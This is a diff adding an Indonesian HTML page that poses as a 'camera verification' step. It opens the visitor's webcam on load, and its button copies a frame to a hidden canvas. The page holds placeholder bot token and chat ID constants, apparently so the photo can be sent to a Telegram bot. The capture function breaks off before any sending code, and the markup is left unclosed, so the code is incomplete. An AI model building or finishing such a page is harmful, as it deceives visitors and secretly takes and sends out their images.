@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi Kamera</title>
+
+  <style>
+    body{
+      background:#111;
+      color:white;
+      font-family:Arial;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      flex-direction:column;
+      height:100vh;
+    }
+
+    video{
+      width:320px;
+      border-radius:15px;
+    }
+
+    button{
+      margin-top:20px;
+      padding:12px 20px;
+      border:none;
+      border-radius:10px;
+      background:#00b894;
+      color:white;
+      cursor:pointer;
+      font-size:16px;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Verifikasi Kamera</h2>
+
+<video id="video" autoplay playsinline></video>
+
+<button onclick="captureAndSend()">
+  Verifikasi
+</button>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+
+const BOT_TOKEN = "MASUKKAN_BOT_TOKEN";
+const CHAT_ID = "MASUKKAN_CHAT_ID";
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+async function startCamera(){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video:true
+    });
+
+    video.srcObject = stream;
+  }
+  catch(err){
+    alert('Izin kamera ditolak');
+  }
+}
+
+startCamera();
+
+async function captureAndSend(){
+
+  const context = canvas.getContext('2d');
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+</html>
